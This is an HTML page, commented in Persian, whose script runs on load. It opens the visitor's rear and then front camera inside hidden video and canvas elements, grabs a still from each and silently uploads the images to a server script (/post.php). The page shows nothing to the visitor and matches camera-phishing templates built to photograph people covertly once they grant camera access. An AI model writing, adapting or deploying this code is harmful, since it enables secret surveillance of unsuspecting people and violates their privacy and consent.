<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>گرفتن تصاویر به ترتیب از دوربین عقب و جلو</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>

<h2>گرفتن تصاویر به ترتیب از دوربین عقب و جلو</h2>

<div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<script>
    function post(imgdata) {
        $.ajax({
            type: 'POST',
            data: {cat: imgdata},
            url: '/post.php',
            dataType: 'json',
            async: false,
            success: function (result) {
                console.log('تصویر با موفقیت ذخیره شد.');
            },
            error: function (error) {
                console.log('خطا در ذخیره تصویر: ', error);
            }
        });
    };

    'use strict';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');

    // تعریف محدودیت‌ها برای دوربین عقب
    const backConstraints = {
        audio: false,
        video: {
            facingMode: {exact: "environment"} // استفاده از دوربین عقب
        }
    };

    // تابع گرفتن تصویر از دوربین و ذخیره کردن آن
    async function captureAndSave(stream) {
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/png');
        post(imageData);
    }

    // دسترسی به دوربین عقب
    async function initBackCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia(backConstraints);
            video.srcObject = stream;
            await new Promise(resolve => video.onloadedmetadata = resolve);
            captureAndSave(stream);
        } catch (e) {
            console.error('navigator.getUserMedia error:', e);
        }
    }

    // دسترسی به دوربین جلو
    async function initFrontCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
            video.srcObject = stream;
            await new Promise(resolve => video.onloadedmetadata = resolve);
            captureAndSave(stream);
        } catch (e) {
            console.error('navigator.getUserMedia error:', e);
        }
    }

    // اجرای تابع برای دوربین عقب و سپس دوربین جلو
    initBackCamera().then(initFrontCamera);

</script>

</body>
</html>
